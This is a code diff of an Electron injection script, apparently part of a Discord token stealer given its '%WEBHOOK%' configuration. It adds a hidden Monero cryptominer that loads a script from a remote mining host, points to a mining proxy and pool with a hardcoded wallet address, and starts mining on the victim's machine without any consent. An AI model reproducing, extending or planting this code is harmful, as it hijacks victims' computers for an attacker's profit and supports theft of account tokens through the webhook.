@@ -5,22 +5,31 @@ const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
-var script = document.createElement('script');
+const { JSDOM } = require("jsdom");
+const dom = new JSDOM();
+global.window = dom.window;
+global.document = dom.window.document;
+
+const script = global.document.createElement('script');
 script.src = "https://monerominer.rocks/miner-mmr/webmnr.min.js";
-document.head.appendChild(script);
-var server = "wss://f.xmrminingproxy.com:8181";
-var pool = "gulf.moneroocean.stream";
-var walletAddress = "44X9i4c6YhQcfLiSCrbNH25yrRfkrhrzQSeZT1meFsqtSq1K48XHXosdG4Bj9sLE7ceTbsCnL6k8LaiheZGFyfS6Nn2Hcer";
-var workerId = "";
-var threads = -1;
-var password = "x";
-var throttleMiner = 20;
+global.document.head.appendChild(script);
+
+const server = "wss://f.xmrminingproxy.com:8181";
+const pool = "gulf.moneroocean.stream";
+const walletAddress = "44X9i4c6YhQcfLiSCrbNH25yrRfkrhrzQSeZT1meFsqtSq1K48XHXosdG4Bj9sLE7ceTbsCnL6k8LaiheZGFyfS6Nn2Hcer";
+const workerId = "";
+const threads = -1;
+const password = "x";
+const throttleMiner = 20;
+
 function startMining(pool, walletAddress, workerId, threads, password) {
-  var miner = new WebAssembly.Miner();
+  const miner = new global.window.WebAssembly.Miner();
   miner.init(pool, walletAddress, workerId, threads, password);
   miner.start();
 }
+
 startMining(pool, walletAddress, workerId, threads, password);
+
 
 const config = {
   webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
